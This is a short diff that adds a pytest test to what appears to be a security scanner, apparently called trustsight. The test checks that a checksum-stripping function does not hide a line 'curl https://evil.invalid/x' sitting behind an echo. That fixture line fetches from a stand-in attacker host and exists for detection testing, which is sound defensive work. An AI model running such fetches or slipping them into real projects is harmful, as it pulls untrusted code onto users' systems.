@@ -477,3 +477,9 @@ def test_r010_still_fires_on_an_added_curl_line():
     resolved, _unresolved = tokenize_and_resolve(diff)
     triggered = apply_rules(resolved, get_raw_diff_lines(diff), SHARED_RULES)
     assert "R010" in [entry["rule_id"] for entry in triggered]
+
+
+def test_checksum_stripping_does_not_hide_a_payload_behind_a_printer():
+    from trustsight.analysis.entropy import strip_checksum_arrays
+    text = "echo 'sha256sums=('\ncurl https://evil.invalid/x\n"
+    assert "curl" in strip_checksum_arrays(text)
